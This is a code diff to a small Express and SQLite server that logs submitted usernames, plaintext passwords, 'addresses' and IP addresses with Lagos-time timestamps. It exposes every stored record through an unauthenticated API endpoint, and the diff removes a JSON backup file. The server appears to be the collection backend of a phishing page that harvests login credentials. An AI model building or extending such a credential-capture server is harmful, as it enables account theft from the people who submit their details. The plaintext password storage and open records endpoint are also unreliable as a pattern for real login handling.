@@ -1,7 +1,6 @@
 const express = require('express');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
-const fs = require('fs');
 
 const app = express();
 app.use(express.json());
@@ -9,7 +8,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const db = new sqlite3.Database('./login_records.db');
 
-// Create table
 db.run(`CREATE TABLE IF NOT EXISTS records (
     id INTEGER PRIMARY KEY,
     type TEXT,
@@ -22,20 +20,11 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
 
 function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-
-    // Save to SQLite
     db.run("INSERT INTO records (type, username, password, address, ip, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
         [type, username, password, address, ip, timestamp], (err) => {
-            if (err) console.error("SQLite Error:", err);
+            if (err) console.error("Save Error:", err);
+            else console.log(`✅ Saved: ${type}`);
         });
-
-    // Backup to JSON file
-    const record = { type, username, password, address, ip, timestamp };
-    fs.appendFile('backup_records.json', JSON.stringify(record) + '\n', (err) => {
-        if (err) console.error("Backup Error:", err);
-    });
-
-    console.log(`✅ Saved: ${type} | User: ${username || '-'} | IP: ${ip}`);
 }
 
 // Routes
@@ -57,6 +46,7 @@ app.post('/api/login', (req, res) => {
 
 app.get('/api/records', (req, res) => {
     db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
+        if (err) console.error(err);
         res.json(rows);
     });
 });
@@ -72,5 +62,5 @@ app.post('/api/clear', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running with Backup`);
+    console.log(`🚀 Server running`);
 });
